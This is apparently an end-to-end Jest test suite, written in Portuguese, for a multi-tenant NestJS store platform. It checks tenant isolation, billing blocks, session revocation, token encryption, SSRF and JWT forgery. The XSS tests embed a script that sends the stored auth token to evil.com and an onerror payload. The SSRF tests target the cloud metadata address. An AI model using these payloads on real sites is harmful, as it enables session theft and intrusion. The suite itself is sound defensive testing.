import { INestApplication } from '@nestjs/common';
import { Role, StoreStatus } from '@prisma/client';
import request from 'supertest';
import { BillingCronService } from '../src/billing/billing-cron.service';
import { SecretsService } from '../src/common/secrets/secrets.service';
import { isEncrypted } from '../src/common/utils/secret-crypto';
import { PrismaService } from '../src/prisma/prisma.service';
import {
  ADDRESS,
  SeededStore,
  createTestApp,
  resetDb,
  seedStore,
  signAdminToken,
  signCustomerToken,
} from './helpers/test-app';

const MP_PUBLIC_KEY = 'TEST-1e0b2c3d-4a5b-6c7d-8e9f-0a1b2c3d4e5f';
const MP_ACCESS_TOKEN = 'TEST-1234567890123456-081412-abcdef123456-987654321';

describe('Segurança e multi-tenant (e2e)', () => {
  let app: INestApplication;
  let prisma: PrismaService;
  let lojaA: SeededStore;
  let lojaB: SeededStore;

  beforeAll(async () => {
    const ctx = await createTestApp();
    app = ctx.app;
    prisma = ctx.prisma;
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await resetDb(prisma);
    lojaA = await seedStore(prisma, { slug: 'loja-a' });
    lojaB = await seedStore(prisma, { slug: 'loja-b' });
  });

  describe('isolamento entre lojas', () => {
    it('forçar x-store-slug não dá ao admin da loja A os pedidos da loja B', async () => {
      // A loja vem do token, não do header: o header é simplesmente ignorado.
      const tokenB = await signCustomerToken(app, lojaB.customer);
      await request(app.getHttpServer())
        .post('/api/checkout/orders')
        .set('x-store-slug', lojaB.store.slug)
        .set('Authorization', `Bearer ${tokenB}`)
        .send({
          items: [{ productId: lojaB.product.id, quantity: 1 }],
          shippingAddress: ADDRESS,
          shippingOptionId: 'padrao',
        })
        .expect(201);

      const token = await signAdminToken(app, lojaA.admin);
      const res = await request(app.getHttpServer())
        .get('/api/admin/orders')
        .set('x-store-slug', lojaB.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      const items = res.body.items ?? res.body.data ?? res.body;
      expect(Array.isArray(items) ? items : []).toHaveLength(0);
    });

    it('admin da loja A não edita produto da loja B', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .patch(`/api/admin/products/${lojaB.product.id}`)
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({ price: 1 })
        .expect(404);

      const product = await prisma.product.findUniqueOrThrow({
        where: { id: lojaB.product.id },
      });
      expect(Number(product.price)).toBe(100);
    });

    it('cliente da loja A não compra na loja B com o próprio token', async () => {
      const token = await signCustomerToken(app, lojaA.customer);

      await request(app.getHttpServer())
        .post('/api/checkout/orders')
        .set('x-store-slug', lojaB.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({
          items: [{ productId: lojaB.product.id, quantity: 1 }],
          shippingAddress: ADDRESS,
          shippingOptionId: 'padrao',
        })
        .expect(401);
    });

    it('cliente não enxerga pedido de outra loja', async () => {
      const tokenA = await signCustomerToken(app, lojaA.customer);
      const tokenB = await signCustomerToken(app, lojaB.customer);

      const pedidoB = await request(app.getHttpServer())
        .post('/api/checkout/orders')
        .set('x-store-slug', lojaB.store.slug)
        .set('Authorization', `Bearer ${tokenB}`)
        .send({
          items: [{ productId: lojaB.product.id, quantity: 1 }],
          shippingAddress: ADDRESS,
          shippingOptionId: 'padrao',
        })
        .expect(201);

      await request(app.getHttpServer())
        .get(`/api/storefront/orders/${pedidoB.body.id}`)
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${tokenA}`)
        .expect(404);
    });

    it('cliente não usa rota de admin', async () => {
      const token = await signCustomerToken(app, lojaA.customer);

      await request(app.getHttpServer())
        .get('/api/admin/orders')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .expect(403);
    });
  });

  describe('mensalidade em atraso', () => {
    const vencer = (storeId: string, dias: number) =>
      prisma.store.update({
        where: { id: storeId },
        data: {
          status: StoreStatus.PAST_DUE,
          planDueAt: new Date(Date.now() - dias * 24 * 60 * 60 * 1000),
        },
      });

    it('bloqueia escrita do lojista', async () => {
      await vencer(lojaA.store.id, 1);
      const token = await signAdminToken(app, lojaA.admin);

      const res = await request(app.getHttpServer())
        .patch(`/api/admin/products/${lojaA.product.id}`)
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({ price: 1 })
        .expect(403);

      expect(String(res.body.message)).toMatch(/mensalidade/i);
    });

    it('mantém leitura para o painel conseguir mostrar a tela de pagamento', async () => {
      await vencer(lojaA.store.id, 1);
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .get('/api/admin/orders')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    });

    it('libera as rotas de cobrança (é por onde o lojista volta a pagar)', async () => {
      await vencer(lojaA.store.id, 1);
      const token = await signAdminToken(app, lojaA.admin);

      const res = await request(app.getHttpServer())
        .get('/api/billing/me')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      expect(res.body.store.accessBlocked).toBe(true);
    });

    it('a vitrine continua vendendo durante a carência', async () => {
      await vencer(lojaA.store.id, 1);
      const token = await signCustomerToken(app, lojaA.customer);

      await request(app.getHttpServer())
        .post('/api/checkout/orders')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({
          items: [{ productId: lojaA.product.id, quantity: 1 }],
          shippingAddress: ADDRESS,
          shippingOptionId: 'padrao',
        })
        .expect(201);
    });

    it('bloqueia mesmo se o job ainda não marcou (status ACTIVE com prazo vencido)', async () => {
      await prisma.store.update({
        where: { id: lojaA.store.id },
        data: {
          status: StoreStatus.ACTIVE,
          planDueAt: new Date(Date.now() - 24 * 60 * 60 * 1000),
        },
      });
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .patch(`/api/admin/products/${lojaA.product.id}`)
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({ price: 1 })
        .expect(403);
    });

    it('loja suspensa derruba a vitrine inteira', async () => {
      await prisma.store.update({
        where: { id: lojaA.store.id },
        data: { status: StoreStatus.SUSPENDED },
      });

      await request(app.getHttpServer())
        .get('/api/catalog/products')
        .set('x-store-slug', lojaA.store.slug)
        .expect(403);
    });
  });

  describe('régua de cobrança', () => {
    it('marca vencida como PAST_DUE e, passada a carência, SUSPENDED', async () => {
      const cron = app.get(BillingCronService);

      await prisma.store.update({
        where: { id: lojaA.store.id },
        data: {
          status: StoreStatus.ACTIVE,
          planDueAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000),
        },
      });
      await prisma.store.update({
        where: { id: lojaB.store.id },
        data: {
          status: StoreStatus.ACTIVE,
          planDueAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000),
        },
      });

      await cron.sweep();

      const a = await prisma.store.findUniqueOrThrow({
        where: { id: lojaA.store.id },
      });
      const b = await prisma.store.findUniqueOrThrow({
        where: { id: lojaB.store.id },
      });

      // 2 dias de atraso: ainda na carência de 7
      expect(a.status).toBe(StoreStatus.PAST_DUE);
      // 30 dias: passou da carência
      expect(b.status).toBe(StoreStatus.SUSPENDED);
    });

    it('não mexe em loja em dia', async () => {
      const cron = app.get(BillingCronService);
      await cron.sweep();

      const a = await prisma.store.findUniqueOrThrow({
        where: { id: lojaA.store.id },
      });
      expect(a.status).toBe(StoreStatus.ACTIVE);
    });
  });

  describe('XSS nas políticas', () => {
    it('script salvo pelo lojista não chega na vitrine', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .patch('/api/stores/me/policies')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({
          termsHtml:
            '<p>Termos</p><script>fetch("//evil.com?t="+localStorage.lv_token)</script>',
        })
        .expect(200);

      const vitrine = await request(app.getHttpServer())
        .get(`/api/stores/public/${lojaA.store.slug}`)
        .expect(200);

      expect(vitrine.body.termsHtml).toBe('<p>Termos</p>');
      expect(vitrine.body.termsHtml).not.toContain('script');
    });

    it('limpa HTML já gravado cru antes da sanitização existir', async () => {
      await prisma.store.update({
        where: { id: lojaA.store.id },
        data: { privacyHtml: '<img src=x onerror="alert(1)">Privacidade' },
      });

      const vitrine = await request(app.getHttpServer())
        .get(`/api/stores/public/${lojaA.store.slug}`)
        .expect(200);

      expect(vitrine.body.privacyHtml).toBe('Privacidade');
    });
  });

  describe('revogação de sessão', () => {
    it('token antigo para de valer quando o tokenVersion muda', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      // simula troca de senha
      await prisma.user.update({
        where: { id: lojaA.admin.id },
        data: { tokenVersion: { increment: 1 } },
      });

      await request(app.getHttpServer())
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${token}`)
        .expect(401);
    });

    it('usuário desativado perde acesso na hora', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      await prisma.user.update({
        where: { id: lojaA.admin.id },
        data: { active: false },
      });

      await request(app.getHttpServer())
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${token}`)
        .expect(401);
    });

    it('cliente removido não usa mais o token', async () => {
      const token = await signCustomerToken(app, lojaA.customer);

      await request(app.getHttpServer())
        .get('/api/storefront/auth/me')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      await prisma.customer.delete({ where: { id: lojaA.customer.id } });

      await request(app.getHttpServer())
        .get('/api/storefront/auth/me')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .expect(401);
    });
  });

  describe('tokens de gateway', () => {
    it('access token do Mercado Pago não fica em texto puro no banco', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .patch('/api/stores/me/mercadopago')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({
          mpAccessToken: MP_ACCESS_TOKEN,
          mpPublicKey: MP_PUBLIC_KEY,
        })
        .expect(200);

      const row = await prisma.store.findUniqueOrThrow({
        where: { id: lojaA.store.id },
        select: { mpAccessToken: true },
      });

      expect(row.mpAccessToken).not.toBe(MP_ACCESS_TOKEN);
      expect(row.mpAccessToken).not.toContain('1234567890123456');
      expect(isEncrypted(row.mpAccessToken)).toBe(true);

      // e volta em claro para quem precisa falar com o gateway
      const secrets = app.get(SecretsService);
      expect(secrets.decrypt(row.mpAccessToken)).toBe(MP_ACCESS_TOKEN);
    });

    it('não devolve o token ao painel, só a dica', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .patch('/api/stores/me/mercadopago')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({ mpAccessToken: MP_ACCESS_TOKEN, mpPublicKey: MP_PUBLIC_KEY })
        .expect(200);

      const res = await request(app.getHttpServer())
        .get('/api/stores/me')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      expect(res.body.mpAccessToken).toBeUndefined();
      expect(res.body.mpAccessTokenSet).toBe(true);
      expect(JSON.stringify(res.body)).not.toContain('987654321');
    });

    it('vitrine pública nunca expõe credencial da loja', async () => {
      await prisma.store.update({
        where: { id: lojaA.store.id },
        data: { mpAccessToken: MP_ACCESS_TOKEN, freteToken: 'token-frete' },
      });

      const res = await request(app.getHttpServer())
        .get(`/api/stores/public/${lojaA.store.slug}`)
        .expect(200);

      const body = JSON.stringify(res.body);
      expect(body).not.toContain(MP_ACCESS_TOKEN);
      expect(body).not.toContain('token-frete');
    });
  });

  describe('SSRF na impressora', () => {
    it('recusa host da rede interna', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      const res = await request(app.getHttpServer())
        .patch('/api/stores/me/printer')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({ printerType: 'NETWORK', printerHost: '169.254.169.254' })
        .expect(400);

      expect(String(res.body.message)).toMatch(/rede interna/i);
    });

    it('recusa loopback', async () => {
      const token = await signAdminToken(app, lojaA.admin);

      await request(app.getHttpServer())
        .patch('/api/stores/me/printer')
        .set('x-store-slug', lojaA.store.slug)
        .set('Authorization', `Bearer ${token}`)
        .send({ printerType: 'NETWORK', printerHost: '127.0.0.1' })
        .expect(400);
    });
  });

  describe('webhook do Mercado Pago', () => {
    it('recusa sem o segredo', async () => {
      await request(app.getHttpServer())
        .post('/api/payments/webhooks/mercadopago')
        .send({ type: 'payment', data: { id: '123' } })
        .expect(401);
    });

    it('recusa com segredo errado', async () => {
      await request(app.getHttpServer())
        .post('/api/payments/webhooks/mercadopago?secret=chute')
        .send({ type: 'payment', data: { id: '123' } })
        .expect(401);
    });

    it('aceita com o segredo certo', async () => {
      await request(app.getHttpServer())
        .post(
          `/api/payments/webhooks/mercadopago?secret=${process.env.MP_WEBHOOK_SECRET}`,
        )
        .send({ type: 'payment' })
        .expect(201);
    });
  });

  describe('autenticação', () => {
    it('rejeita token assinado com outro segredo', async () => {
      // token válido em estrutura, assinado com segredo diferente
      const falso =
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' +
        Buffer.from(
          JSON.stringify({ sub: lojaA.admin.id, role: Role.SUPER_ADMIN }),
        ).toString('base64url') +
        '.assinatura-invalida';

      await request(app.getHttpServer())
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${falso}`)
        .expect(401);
    });

    it('login com senha errada não vaza se o e-mail existe', async () => {
      const existente = await request(app.getHttpServer())
        .post('/api/auth/login')
        .send({ email: lojaA.admin.email, password: 'errada' });

      const inexistente = await request(app.getHttpServer())
        .post('/api/auth/login')
        .send({ email: 'ninguem@teste.local', password: 'errada' });

      expect(existente.status).toBe(401);
      expect(inexistente.status).toBe(401);
      expect(existente.body.message).toBe(inexistente.body.message);
    });
  });
});
